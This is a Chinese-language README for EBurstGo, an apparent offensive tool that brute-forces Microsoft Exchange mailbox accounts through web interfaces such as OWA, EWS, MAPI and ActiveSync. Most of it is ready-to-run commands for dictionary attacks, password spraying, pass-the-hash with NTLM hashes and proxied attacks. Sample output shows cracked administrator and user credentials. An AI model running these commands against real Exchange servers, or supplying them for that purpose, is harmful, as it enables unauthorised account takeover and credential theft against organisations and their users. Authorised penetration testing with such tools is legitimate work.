# EBurstGo

利用 Exchange 服务器 Web 接口爆破邮箱账户

参考 [grayddq/EBurst](https://github.com/grayddq/EBurst) 项目使用 Go 语言重构

支持接口

```shell
/autodiscover
/owa/auth.owa # OWA & ECP
/ews
/mapi
/oab
/rpc
/Microsoft-Server-ActiveSync
/powershell
```

注意 Releases 中的代码不一定是最新的

建议将本项目 clone 下来然后执行 `goreleaser build --snapshot` 手动编译

## Usage

usage

```shell
Usage of ./EBurstGo:
  -check
    	检测目标 Exchange 可用接口
  -debug
    	显示 Debug 信息
  -delay int
    	请求延时
  -domain string
    	AD 域名
  -mode string
    	指定 Exchange Web 接口
  -nocolor
    	关闭输出颜色
  -nosave
    	不将结果输出至文件
  -o string
    	指定结果输出文件 (default "result.txt")
  -pass string
    	指定密码
  -passf string
    	密码字典
  -proxy string
    	指定 socks/http(s) 代理
  -pth
    	指定为 Pth 模式 (Pass The Hash)
  -t int
    	协程数量 (default 2)
  -url string
    	Exchange 服务器地址
  -user string
    	指定用户名
  -user-as-pass
    	指定密码与用户名相同
  -userf string
    	用户名字典
  -userpassf string
    	指定用户名密码字典 (user:pass)
  -v	显示详细信息
```

check

```shell
$ ./EBurstGo -url https://192.168.30.11 -check
[*] 检测目标 Exchange 可用接口
[+] 存在 owa 接口 (/owa/auth.owa), 可以爆破
[+] 存在 powershell 接口 (/powershell), 可以爆破
[+] 存在 ecp 接口 (/owa/auth.owa), 可以爆破
[+] 存在 autodiscover 接口 (/autodiscover), 可以爆破
[+] 存在 mapi 接口 (/mapi), 可以爆破
[+] 存在 activesync 接口 (/Microsoft-Server-ActiveSync), 可以爆破
[+] 存在 oab 接口 (/oab), 可以爆破
[+] 存在 ews 接口 (/ews), 可以爆破
[+] 存在 rpc 接口 (/rpc), 可以爆破
```

brute

默认会将爆破成功的账户追加写入 result.txt

```shell
# 常规爆破
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews

# 指定用户名
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -user Alice -passf pass.txt -mode ews

# 密码喷洒
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -pass 'Changeme123' -mode ews

# 支持 user:pass 格式的字典
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userpassf userpass.txt -mode ews

# 密码与用户名相同
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -user-as-pass -mode ews

# Pth 爆破 (pass.txt 为 NTLM Hash)
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews -pth

# 设置 socks/http(s) 代理
./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews -socks socks5://127.0.0.1:1080
```

examples

```shell
$ ./EBurstGo -url https://192.168.30.11 -domain hack-my.com -userf user.txt -passf pass.txt -mode ews
[*] 用户名:7 密码:9 共计:63
[*] 使用 ews 接口爆破: https://192.168.30.11
[+] 成功: Administrator:abcd1234!@#$
[+] 成功: Alice:Alice123!
[+] 成功: Bob:Bob123!
[+] 成功: Marry:Marry123!
[*] 耗时: 3.031753209s
```

## Todo

- 开启代理使用 NTLM 认证爆破一段时间后出现 `connection refused`, 待解决
  这个目前来说好像没有什么好的解决方法(?) 只能通过将协程数量调小 + 添加延时来避免
- `/powershell` 接口 (Kerberos 认证) 待支持